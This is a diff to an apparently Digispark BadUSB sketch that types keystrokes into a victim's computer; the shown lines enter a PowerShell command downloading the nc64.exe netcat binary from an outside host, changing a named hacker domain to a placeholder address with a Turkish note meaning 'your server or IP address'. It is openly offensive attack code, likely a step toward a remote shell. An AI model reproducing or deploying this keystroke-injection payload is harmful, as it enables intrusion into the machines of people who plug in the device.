@@ -16,7 +16,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("$WebClient.DownloadFile('http://tls.beyazhacker.com/nc64.exe','nc64.exe')");
+  DigiKeyboard.print("$WebClient.DownloadFile('http://192.168.1.1(sunucu veya ip adresiniz/nc64.exe','nc64.exe')");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(2500);
